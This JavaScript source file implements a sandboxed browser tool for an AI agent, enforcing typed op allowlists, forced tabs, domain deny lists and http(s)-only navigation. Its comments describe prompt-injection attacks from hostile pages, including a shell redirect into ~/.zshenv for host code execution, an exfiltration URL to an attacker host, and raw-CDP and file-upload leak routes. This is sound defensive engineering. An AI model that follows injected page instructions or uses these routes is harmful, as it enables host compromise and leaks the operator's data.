// browser_tool_impl.mjs — the PURE, plugin-free logic behind the opencode
// browser-agent's ONLY tool (`browser.js`). Kept separate from browser.js so it
// carries NO `@opencode-ai/plugin` import and is unit-testable with `node:test`
// (mock `fetchImpl` + `readToken`). opencode's tool loader globs `tools/*.{ts,js}`
// only, so this `.mjs` sibling is NOT registered as a tool — it is merely imported
// by browser.js (verified against opencode 1.18.4 via `opencode debug agent`).
//
// WHY this exists (the security reversal — PR #180 / RCE fix): the browser-agent
// previously got opencode's raw *bash* tool, permission-scoped to `browser --tab
// <id> *`. A shell OUTPUT REDIRECTION (`browser --tab N eval '…' >> ~/.zshenv`) is
// NOT a separate command node, so it rode the allowed `browser` command through
// opencode's wildcard glob and the shell performed the redirect → a hostile page
// could induce the model to write to a sourced dotfile → host RCE. The fix removes
// the shell entirely: the model calls THIS tool with TYPED arguments (op + a few
// optional scalars). There is no command string, so no `>`/`>>`/`;`/`|`/`$()`/
// backtick surface exists at all. The tool talks to the loopback browser-bridge
// server directly over HTTP (zero subprocess, zero shell).
//
// The MODEL cannot choose the tab, the instance, or the domain policy: those are
// forced by ENV the `browser-agent` wrapper sets per run (BROWSER_AGENT_TAB, …).
// Enforcement (op allowlist + domain deny + forced tab) lives HERE, in-process.

import { readFileSync, appendFileSync } from "node:fs";
import { homedir } from "node:os";

// Ops the agent may request → the server-side op name the bridge understands.
// (Mirrors the `browser` CLI's own mapping; NO open/close/tabs/release — the
// wrapper owns the tab lifecycle and `tabs` would leak other tabs' URLs.)
//
// The CDP ops (frames/click/type/key + `--frame` reads) are here so the agent can
// DRIVE an app (reach an in-app tab, submit a generation) and read INTO a
// cross-origin iframe. CRITICAL (RCE-class invariant, PR #180 lineage): these are
// BOUNDED TYPED ops only. There is NO `cdp`/`method`/`params` op — the model can
// never send an arbitrary CDP command (Page.navigate file://, Runtime.evaluate for
// exfil, Browser.*, Target.*, Fetch.*). buildRequest below constructs the wire body
// field-by-field from a WHITELIST, so any extra arg the model smuggles (a `cdp`, a
// `tab`, a `method`) is silently dropped, never forwarded. Keep it a whitelist.
// `activate` foregrounds the agent's OWN (env-forced) tab so a foreground-
// REQUIRING SPA (throttled while the agent's tab is backgrounded by design)
// finishes loading and can then be driven. Own-tab-scoped like every other op —
// the model can never activate an ARBITRARY tab (the tab is forced by env, not a
// model arg). Typed, bounded, NO raw passthrough. It STEALS the user's focus (the
// one intrusive op) — used to LOAD the app the agent was told to drive.
// `whoami` is a READ-ONLY, GLOBAL diagnostic: it is NOT a /cmd op (it hits the
// server's GET /whoami, has no tab, drives nothing) — it lets the agent confirm
// which HOST + which browser profile it is connected to before acting. It maps to
// itself only so it passes the uniform op-allowlist gate below; buildRequest
// SHORT-CIRCUITS it to a GET before any /cmd body is built. Metadata only (host
// label, instance labels, active-tab domains, versions — never page content).
export const OP_TO_SERVER = Object.freeze({
  text: "text",
  html: "getHtml",
  eval: "eval",
  nav: "nav",
  screenshot: "screenshot",
  frames: "frames",
  click: "click",
  type: "type",
  key: "key",
  activate: "activate",
  upload: "upload",
  whoami: "whoami",
});

// The AUTONOMOUS model's DEFAULT op set — 11 ops, identical to browser.js's typed
// `op` enum, the agent-md capability table, and the README's published contract.
// Keep those four in lockstep (tests/browser_tool.test.mjs parses all four and
// asserts they match, so a drift fails CI).
//
// `upload` is DELIBERATELY ABSENT here. It populates an <input type=file> from a
// caller-chosen ABSOLUTE PATH via CDP DOM.setFileInputFiles, with NO path
// allowlist: Chrome reads the file by path itself (same host, no bytes cross the
// bridge), but the CONTENTS of any readable file could be posted to the target
// site. That exfil tradeoff is acceptable for the OPERATOR driving the `browser`
// CLI by hand (deliberate, audit-logged, human-chosen path) — it is NOT acceptable
// as a default for a cheap model that is by design pointed at untrusted,
// prompt-injecting pages, where the "caller" choosing the path can effectively be
// the page. `upload` stays in OP_TO_SERVER so it remains REACHABLE, but only via
// an explicit, deliberate `BROWSER_AGENT_ALLOWED_OPS` opt-in (documented in the
// README) — never by default, and never by anything the model can set itself.
export const ALLOWED_OPS_DEFAULT = Object.freeze([
  "text", "html", "eval", "nav", "screenshot",
  "frames", "click", "type", "key", "activate", "whoami",
]);

export const TEXT_MAX_BYTES_DEFAULT = 32768;
const SCREENSHOT_NOTE_MAX = 200; // never spill a base64 image blob into the model

// A refusal the model is expected to SEE and adapt to (bad op / denied domain /
// missing field). Thrown so opencode surfaces it as a tool error to the model;
// the run continues (the model can try another op/domain).
export class BrowserToolRefusal extends Error {
  constructor(reason) {
    super(`browser-tool: refused: ${reason}`);
    this.name = "BrowserToolRefusal";
    this.reason = reason;
  }
}

function _list(s) {
  // Split a space/comma separated domain list into lowercased, non-empty tokens.
  return String(s || "")
    .split(/[\s,]+/)
    .map((x) => x.trim().toLowerCase())
    .filter(Boolean);
}

export function hostOf(url) {
  try {
    return (new URL(String(url)).hostname || "").toLowerCase();
  } catch {
    return "";
  }
}

// The ONLY schemes a `nav` may target. Anything else — file:, data:, about:,
// javascript:, chrome:, blob:, view-source:, … — has an EMPTY hostname, so the
// host allow/deny gate (hostDenied) treats it as "no host → not gated" and would
// let it through, bypassing the operator's `--allow-domains` confinement. Such a
// URL could load attacker HTML in the owned tab, run inline script, or (if the
// browser's file-URL toggle is on) read a local file. So a non-http(s) nav is
// refused OUTRIGHT, before any bridge fetch, regardless of the allow/deny lists
// (PR #180 hardening 1).
export const NAV_ALLOWED_SCHEMES = Object.freeze(["http:", "https:"]);

// The lowercased URL scheme (protocol, incl. the trailing ":"), or "" if the URL
// does not parse (an unparseable/relative nav target has no confirmable scheme →
// it is refused just like a disallowed scheme).
export function navSchemeOf(url) {
  try {
    return (new URL(String(url)).protocol || "").toLowerCase();
  } catch {
    return "";
  }
}

function _matches(host, domain) {
  // host equals the domain, or is a subdomain of it (`.example.com`).
  return host === domain || host.endsWith("." + domain);
}

// Domain policy: a deny match wins; if an allowlist is set, a host matching NONE
// of it is treated as denied; otherwise allowed. (Same semantics the old PATH-shim
// guard enforced, now moved in-process — Fix #2: deny is binding on every nav.)
export function hostDenied(host, allowList, denyList) {
  if (!host) return false; // no resolvable host (e.g. about:blank) → not gated here
  for (const d of denyList) if (_matches(host, d)) return true;
  if (allowList.length) {
    for (const d of allowList) if (_matches(host, d)) return false;
    return true;
  }
  return false;
}

// BROWSER_AGENT_ALLOWED_OPS — the operator's explicit op-set override (a space/
// comma separated list). Unset/empty → ALLOWED_OPS_DEFAULT (the 11-op browser-only
// set). Set → it REPLACES the default wholesale, so it can both narrow the agent
// (`"text,html"`) and deliberately re-enable an off-by-default op such as `upload`.
// It is read from the wrapper's environment, which the MODEL cannot influence.
export function allowedOpsFromEnv(env) {
  const raw = _list(env.BROWSER_AGENT_ALLOWED_OPS);
  return raw.length ? raw : [...ALLOWED_OPS_DEFAULT];
}

// Resolve the FORCED tab from env. The model has no tab argument at all, so it can
// never target another tab; a missing/invalid BROWSER_AGENT_TAB is a hard misconfig
// (the wrapper always sets it) and is refused as a disowned tab.
export function forcedTab(env) {
  const raw = String(env.BROWSER_AGENT_TAB ?? "").trim();
  if (!/^[0-9]+$/.test(raw)) {
    throw new BrowserToolRefusal(`disowned_tab:${raw || "<unset>"}`);
  }
  return Number(raw);
}

// Forward an optional `--frame` (frameId or url-substring) so a read/click runs
// INSIDE a cross-origin frame. A TYPED scalar only — it selects a frame, it is NOT
// a CDP command. Bounded to a length so a pathological value can't bloat the body.
function _addFrame(body, args) {
  if (args && args.frame != null && args.frame !== "") {
    body.frame = String(args.frame).slice(0, 512);
  }
}

function _coerceMaxBytes(v) {
  if (v === undefined || v === null || v === "") return TEXT_MAX_BYTES_DEFAULT;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0 || !Number.isInteger(n)) {
    throw new BrowserToolRefusal(`bad_maxBytes:${v}`);
  }
  return n;
}

// Build the exact {url, headers, body} for a POST /cmd, enforcing the op allowlist,
// the forced tab, and (for nav/eval) the domain policy. Throws BrowserToolRefusal
// on any policy violation. `token` is the pre-read bearer secret.
export function buildRequest(args, env, token) {
  const op = String((args && args.op) || "");
  const allowed = allowedOpsFromEnv(env);
  if (!allowed.includes(op) || !(op in OP_TO_SERVER)) {
    throw new BrowserToolRefusal(`op_not_allowed:${op || "<none>"}`);
  }
  // whoami is a GLOBAL, read-only GET /whoami — no tab, no /cmd body. Short-
  // circuit BEFORE forcedTab (it is not tab-scoped) and before any /cmd body is
  // built. No typed args are forwarded (nothing to smuggle).
  if (op === "whoami") {
    const host = env.BROWSER_BRIDGE_HOST || "127.0.0.1";
    const port = env.BROWSER_BRIDGE_PORT || "8788";
    return {
      method: "GET",
      url: `http://${host}:${port}/whoami`,
      headers: {
        Authorization: `Bearer ${token}`,
        Host: "127.0.0.1", // #168 loopback Host-allowlist invariant
      },
      body: null,
    };
  }
  const tab = forcedTab(env); // may throw disowned_tab
  const allowList = _list(env.BROWSER_AGENT_ALLOW_DOMAINS);
  const denyList = _list(env.BROWSER_AGENT_DENY_DOMAINS);

  const body = { op: OP_TO_SERVER[op], tab };
  const instance = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
  if (instance) body.target = instance;

  if (op === "nav") {
    const url = args && args.url;
    if (!url) throw new BrowserToolRefusal("nav_missing_url");
    // Scheme gate FIRST: a non-http(s) target (file:/data:/about:/javascript:/…)
    // has no host and would slip past the domain confinement — refuse it here,
    // before host allow/deny is even consulted.
    const scheme = navSchemeOf(url);
    if (!NAV_ALLOWED_SCHEMES.includes(scheme)) {
      throw new BrowserToolRefusal(`nav_scheme_denied:${scheme || "<none>"}`);
    }
    const host = hostOf(url);
    if (hostDenied(host, allowList, denyList)) {
      throw new BrowserToolRefusal(`domain_blocked:${host || url}`);
    }
    body.url = String(url);
  } else if (op === "eval") {
    const js = args && args.js;
    if (!js) throw new BrowserToolRefusal("eval_missing_js");
    // Best-effort defence-in-depth (mirrors the retired guard shim): refuse an
    // eval that literally references a denied host. A cheap model cannot be fully
    // sandboxed — `nav` is the real navigation gate; this catches the obvious
    // `location.href='https://denied/'` case. Documented as best-effort.
    const jl = String(js).toLowerCase();
    for (const d of denyList) {
      if (jl.includes(d)) throw new BrowserToolRefusal(`eval_references_blocked:${d}`);
    }
    body.js = String(js);
    _addFrame(body, args);
  } else if (op === "text") {
    if (args && args.selector) body.selector = String(args.selector);
    body.maxBytes = _coerceMaxBytes(args ? args.maxBytes : undefined);
    _addFrame(body, args);
  } else if (op === "html") {
    _addFrame(body, args);
  } else if (op === "click") {
    if (!args || !args.selector) throw new BrowserToolRefusal("click_missing_selector");
    body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "type") {
    const text = args && args.text;
    if (text == null || text === "") throw new BrowserToolRefusal("type_missing_text");
    body.text = String(text);
    if (args && args.selector) body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "key") {
    if (!args || !args.key) throw new BrowserToolRefusal("key_missing_key");
    body.key = String(args.key);
    if (args && args.selector) body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "activate") {
    // Optional bounded wait-for-load. A TYPED non-negative int only — the server
    // clamps it to its own cap; an invalid value is refused (never forwarded raw).
    if (args && args.waitMs != null && args.waitMs !== "") {
      const n = Number(args.waitMs);
      if (!Number.isFinite(n) || n < 0 || !Number.isInteger(n)) {
        throw new BrowserToolRefusal(`bad_waitMs:${args.waitMs}`);
      }
      body.waitMs = n;
    }
  } else if (op === "upload") {
    // Populate a file input. TYPED scalars only: selector + path (+ optional frame).
    // NOT in ALLOWED_OPS_DEFAULT — unreachable unless the operator explicitly opts
    // in via BROWSER_AGENT_ALLOWED_OPS (see the note on ALLOWED_OPS_DEFAULT). When
    // opted in, ANY path is allowed (the explicit exfil tradeoff) and the server
    // audit-logs every upload. Only these fields reach the wire — a smuggled
    // cdp/method/params is dropped (the whitelist build below).
    if (!args || !args.selector) throw new BrowserToolRefusal("upload_missing_selector");
    if (!args.path) throw new BrowserToolRefusal("upload_missing_path");
    body.selector = String(args.selector);
    body.path = String(args.path);
    _addFrame(body, args);
  }
  // frames / screenshot: no extra typed fields (the tab is forced by env).

  const host = env.BROWSER_BRIDGE_HOST || "127.0.0.1";
  const port = env.BROWSER_BRIDGE_PORT || "8788";
  const sessionId = String(env.BROWSER_AGENT_SESSION_ID || "browser-agent");
  return {
    url: `http://${host}:${port}/cmd`,
    headers: {
      Authorization: `Bearer ${token}`,
      Host: "127.0.0.1", // loopback Host-allowlist invariant (#168)
      "X-Session-Id": sessionId, // routing-only; forced `tab` overrides ownership
      "Content-Type": "application/json",
    },
    body,
  };
}

// Pull a compact, model-facing string out of the server's 200 envelope. NEVER
// dumps a base64 screenshot blob into the model context.
//
// `env` is only consulted by `whoami`, to narrow the instance list to the agent's
// OWN forced instance (see that branch). It defaults to {} so every other op — and
// every existing caller/test — is unaffected; an absent env simply means "no
// instance forced", which is already the safe shape (no browsing domains are ever
// emitted regardless).
export function summarizeResult(op, envelope, env = {}) {
  const data = (envelope && envelope.data) || {};
  if (op === "text") return typeof data.text === "string" ? data.text : JSON.stringify(data);
  if (op === "html") return typeof data.html === "string" ? data.html : JSON.stringify(data);
  if (op === "eval") {
    const v = "value" in data ? data.value : data.result;
    return typeof v === "string" ? v : JSON.stringify(v ?? data);
  }
  if (op === "nav") {
    return JSON.stringify({ ok: true, url: data.url ?? null, title: data.title ?? null });
  }
  if (op === "screenshot") {
    const du = typeof data.dataUrl === "string" ? data.dataUrl : "";
    return JSON.stringify({ ok: true, screenshot: true, bytes: du.length,
      note: du.slice(0, SCREENSHOT_NOTE_MAX) ? "captured" : "empty" });
  }
  if (op === "frames") {
    // Compact frame metadata (frameId/url/name) so the model can pick a --frame.
    return JSON.stringify(Array.isArray(data.frames) ? data.frames : data);
  }
  if (op === "click") {
    return JSON.stringify({ ok: true, clicked: data.clicked ?? null,
      x: data.x ?? null, y: data.y ?? null });
  }
  if (op === "type") {
    // Never echo the typed text back to the model context — only the length.
    return JSON.stringify({ ok: true, typed: data.typed ?? null });
  }
  if (op === "key") {
    return JSON.stringify({ ok: true, key: data.key ?? null });
  }
  if (op === "upload") {
    // Metadata-only confirmation: the selector + the BASENAME(s) set (never the
    // full path — that stays server/CLI-side + in the audit log) + the frame.
    return JSON.stringify({ ok: true, selector: data.selector ?? null,
      files: Array.isArray(data.files) ? data.files : [],
      frame: data.frame ?? null });
  }
  if (op === "activate") {
    // Compact confirmation the tab foregrounded (metadata only — no page content).
    // `i3` reports host-side i3 window focusing: applied | skipped | failed.
    return JSON.stringify({ ok: true, tabId: data.tabId ?? null,
      active: data.active ?? null, status: data.status ?? null,
      i3: data.i3 ?? null,
      url: data.url ?? null, title: data.title ?? null });
  }
  if (op === "whoami") {
    // Identity + diagnostics. `envelope` IS the whole whoami object (no .data).
    // METADATA ONLY, and NARROWED to the op's stated purpose: "which HOST and
    // which PROFILE am I on". No page content, no full URLs, and — critically —
    // no reconnaissance of the OPERATOR'S OTHER PROFILES.
    //
    // Two fields the server returns are deliberately DROPPED here:
    //
    //  1. `activeTabDomain`, on every instance. The server's whoami_snapshot
    //     iterates ALL live instances, so a bare passthrough tells the model what
    //     the operator is browsing in unrelated profiles (e.g. a `banking` profile
    //     sitting on chase.com while the agent runs on `work`). With no
    //     --allow-domains set, hostDenied() permits any host, so that is one
    //     `nav https://attacker/?d=<domain>` away from exfil — by a model that is
    //     by design reading untrusted, prompt-injecting pages. This is exactly the
    //     leak the OP_TO_SERVER comment cites as the reason `tabs` is excluded
    //     ("`tabs` would leak other tabs' URLs"); whoami reintroduced a narrower
    //     version of it. Dropped unconditionally — the agent never needs to know
    //     what any tab, including its own, is pointed at (it can read its own).
    //  2. The git HEAD inside `server_version` ({version, git:<short sha>}). Only
    //     the human-facing `version` survives; the commit sha is host-internal
    //     state with no bearing on "which profile am I on".
    //
    // The instance list is also FILTERED to the agent's own forced instance
    // (BROWSER_AGENT_INSTANCE — the same value buildRequest sends as `target`,
    // set by the wrapper, unsettable by the model). The wrapper accepts either an
    // auto key or a label there, so match either. If an instance is forced and
    // nothing matches, return an empty list rather than falling back to "all" —
    // failing closed on reconnaissance. When no instance is forced (the bridge
    // auto-routes) the list is left as-is; it then carries only key/label/version,
    // never a browsing domain.
    const w = envelope || {};
    const host = w.host || {};
    const bridge = w.bridge || {};
    const instances = Array.isArray(w.instances) ? w.instances : [];
    const sv = bridge.server_version;
    const own = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
    const mine = own
      ? instances.filter((i) => i.key === own || i.label === own)
      : instances;
    return JSON.stringify({
      host: { label: host.label ?? null, source: host.source ?? null },
      bridge: {
        endpoint: bridge.endpoint ?? null,
        connected: bridge.connected ?? null,
        // Drop the git HEAD: keep only the human-facing version string.
        server_version: (sv && typeof sv === "object" ? sv.version : sv) ?? null,
        extension_version_current: bridge.extension_version_current ?? null,
      },
      instances: mine.map((i) => ({
        key: i.key ?? null, label: i.label ?? null,
        extension_version: i.extension_version ?? null,
      })),
    });
  }
  return JSON.stringify(data);
}

function _audit(env, decision, op, detail) {
  // Metadata-only audit line (#173): op + decision + a short detail (host/op) —
  // NEVER page content. Best-effort; a failure here never fails the tool.
  const path = env.BROWSER_AGENT_AUDIT;
  if (!path) return;
  try {
    const line = JSON.stringify({
      ts: Math.round(Date.now()) / 1000,
      tool: "browser", decision, op: op || "?", detail: detail || "",
    }) + "\n";
    appendFileSync(path, line);
  } catch { /* best-effort */ }
}

// The tool entrypoint. Returns a model-facing STRING on success/dry-run; throws
// BrowserToolRefusal on a policy violation and Error on infra failure.
//   opts.env        — environment (default process.env)
//   opts.fetchImpl  — fetch (default global fetch)
//   opts.readToken  — () => bearer secret string (default: read the token file)
export async function runBrowserOp(args, opts = {}) {
  const env = opts.env || (typeof process !== "undefined" ? process.env : {});
  const fetchImpl = opts.fetchImpl || (typeof fetch !== "undefined" ? fetch : null);
  const op = String((args && args.op) || "");

  // Dry-run intercept for navigating/mutating ops — log + synthesize, never touch
  // the browser (mirrors the retired guard's --dry-run). Still enforces the op
  // allowlist + forced tab first, so a bad op/tab is refused even in dry-run.
  const dry = String(env.BROWSER_AGENT_DRY_RUN || "") === "1";
  // Intercept the MUTATING ops (navigate / evaluate / trusted input) so a dry-run
  // never actually drives the browser, while still enforcing the op allowlist +
  // forced tab (a bad op/tab is refused even in dry-run).
  const MUTATING = op === "nav" || op === "eval" ||
                   op === "click" || op === "type" || op === "key" ||
                   op === "activate" ||  // activate steals focus → never in a dry-run
                   op === "upload";      // upload populates a file input → never in a dry-run
  if (dry && MUTATING) {
    const allowed = allowedOpsFromEnv(env);
    if (!allowed.includes(op)) throw new BrowserToolRefusal(`op_not_allowed:${op}`);
    forcedTab(env); // refuse a disowned tab even in dry-run
    // Enforce domain policy on a dry-run nav too (so a dry-run can't "preview" a
    // denied domain and mislead).
    if (op === "nav") {
      const scheme = navSchemeOf(args && args.url);
      if (!NAV_ALLOWED_SCHEMES.includes(scheme)) {
        throw new BrowserToolRefusal(`nav_scheme_denied:${scheme || "<none>"}`);
      }
      const host = hostOf(args && args.url);
      if (hostDenied(host, _list(env.BROWSER_AGENT_ALLOW_DOMAINS),
                     _list(env.BROWSER_AGENT_DENY_DOMAINS))) {
        throw new BrowserToolRefusal(`domain_blocked:${host || (args && args.url)}`);
      }
    }
    _audit(env, "dry_run", op, (args && (args.url || "")) || "");
    return JSON.stringify({ ok: true, dryRun: true, op });
  }

  const readToken = opts.readToken || (() => _readTokenFile(env));
  const token = readToken();
  if (!token) throw new Error("browser-tool: no bearer token (BROWSER_BRIDGE_TOKEN_FILE unreadable)");
  if (!fetchImpl) throw new Error("browser-tool: no fetch implementation available");

  let req;
  try {
    req = buildRequest(args, env, token);
  } catch (e) {
    if (e instanceof BrowserToolRefusal) _audit(env, "refused", op, e.reason);
    throw e;
  }

  _audit(env, "exec", op, op === "nav" ? hostOf(args.url) : "");
  let resp;
  try {
    const method = req.method || "POST";
    const init = { method, headers: req.headers };
    // A GET (whoami) carries no body; a /cmd POST sends the typed command body.
    if (method !== "GET") init.body = JSON.stringify(req.body);
    resp = await fetchImpl(req.url, init);
  } catch (e) {
    throw new Error(`browser-tool: transport error talking to the bridge: ${e && e.message}`);
  }
  const status = resp.status;
  const textBody = await resp.text();
  if (status !== 200) {
    throw new Error(`browser-tool: bridge returned HTTP ${status}: ${textBody.slice(0, 300)}`);
  }
  let outer;
  try {
    outer = JSON.parse(textBody);
  } catch {
    throw new Error("browser-tool: unparseable bridge response");
  }
  // whoami returns the diagnostic object DIRECTLY ({ok,host,bridge,instances}) —
  // there is no {result:<envelope>} wrapper like /cmd. Summarize it as-is.
  if (op === "whoami") return summarizeResult("whoami", outer, env);
  const envelope = outer && outer.result;
  if (envelope && envelope.ok === false) {
    // An op-level failure in the page (e.g. owned_tab_gone) — surface to the model.
    throw new BrowserToolRefusal(`op_failed:${envelope.error || "unknown"}`);
  }
  return summarizeResult(op, envelope || {});
}

function _readTokenFile(env) {
  try {
    const path = env.BROWSER_BRIDGE_TOKEN_FILE
      || `${homedir()}/.config/browser-bridge/token`;
    return readFileSync(path, "utf8").trim();
  } catch {
    return "";
  }
}
